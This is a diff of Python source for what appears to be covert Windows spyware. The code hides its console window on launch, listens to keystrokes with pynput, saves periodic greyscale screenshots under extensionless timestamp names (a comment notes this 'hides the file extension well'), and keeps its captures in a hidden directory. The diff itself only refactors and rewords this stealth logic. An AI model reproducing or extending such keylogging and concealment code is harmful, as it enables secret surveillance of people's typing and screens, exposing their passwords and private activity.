@@ -1,4 +1,4 @@
-from pynput.keyboard import Listener
+from pynput.keyboard import Key, Listener
 from pyautogui import screenshot, position
 from threading import Thread
 from time import sleep
@@ -13,15 +13,16 @@ import DecryptionTests
 
 
 def Hide():
-    win = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(win, 0)
+    # hide the console window
+    win32gui.ShowWindow(win32console.GetConsoleWindow(),
+                        0)
 
 
 Hide()  # placed here to speed it up, as with python it's sequential
 
 
 def ScreenShot():
-    # that hides the extension well
+    # that hides the file extension well
     screenshot().convert("L").save(globalVariables.screenshotsPath + "\\" + datetime.now().
                                    strftime("%d%H%M%S"),
                                    "jpeg",
@@ -31,9 +32,9 @@ def ScreenShot():
 
 
 def IsCurrentWindowNameInBlockedList():
-    currentActiveWindowTitle = GetWindowText(GetForegroundWindow())
     for window in DecryptionTests.unwantedWindowTitlesSet:
-        if window in currentActiveWindowTitle:
+        # GetWindowText(GetForegroundWindow()) - currently active window
+        if window in GetWindowText(GetForegroundWindow()):
             return True
     return False
 
@@ -58,6 +59,7 @@ def On_press(key):
     globalVariables.key_press_date = datetime.now()
     # if globalVariables.stop_threads:
     #     Thread(target=CheckForKeyActivity).exit()
+    # new below
 
 
 def CheckForKeyActivity():
@@ -78,7 +80,7 @@ def StopOnceItGetsTooBig():
             pass
         if globalVariables.stop_threads:
             break
-        sleep(60 * 60 * 5)  # execute check every 5 hours
+        sleep(globalVariables.FOLDER_CHECK_TIME_PERIOD_IN_SECONDS)
 
 
 # if the directory doesn't exist, create it and set to hidden
